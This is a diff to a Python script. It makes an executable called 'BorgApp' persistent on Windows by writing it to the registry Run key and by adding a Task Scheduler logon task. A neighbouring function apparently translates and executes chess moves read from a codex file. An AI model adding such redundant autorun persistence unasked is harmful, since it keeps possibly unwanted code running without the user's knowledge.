@@ -53,26 +53,43 @@ def translate_and_execute_chess_moves(chess_moves, codex_file):
     except Exception as e:
         print(f"Error during cleanup: {e}")
 
-# Function to add the executable to Windows startup via registry
+# Function to add the executable to Windows startup and Task Scheduler
 def add_to_startup(executable_path, app_name="BorgApp"):
     try:
-        # Open the registry key for the current user's startup programs
+        # Add to Windows startup via registry
         key = winreg.OpenKey(
             winreg.HKEY_CURRENT_USER,
             r"Software\Microsoft\Windows\CurrentVersion\Run",
             0,
             winreg.KEY_SET_VALUE
         )
-        # Set the new value with the path to the executable
         winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, executable_path)
         winreg.CloseKey(key)
-        print(f"Successfully added {executable_path} to startup.")
+        print(f"Successfully added {executable_path} to registry startup.")
 
-        # Verify if the key was successfully added
+        # Verify the registry key
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
         value, _ = winreg.QueryValueEx(key, app_name)
         print(f"Registry Key Value for {app_name}: {value}")
         winreg.CloseKey(key)
+
+        # Add to Task Scheduler
+        user = os.getlogin()  # Get the current user
+        cmd = [
+            'schtasks', '/Create', '/F',
+            '/SC', 'ONLOGON',  # Trigger task on logon
+            '/TN', app_name,  # Task name
+            '/TR', f'"{executable_path}"',  # Task action (run executable)
+            '/RU', user  # Run under the current user
+        ]
+
+        print(f"Running Task Scheduler command: {' '.join(cmd)}")
+        result = subprocess.run(cmd, capture_output=True, text=True)
+
+        if result.returncode == 0:
+            print(f"Successfully added {executable_path} to Task Scheduler.")
+        else:
+            print(f"Failed to add task to Task Scheduler. Error: {result.stderr}")
     except Exception as e:
         print(f"Failed to add {executable_path} to startup: {e}")
         print(traceback.format_exc())
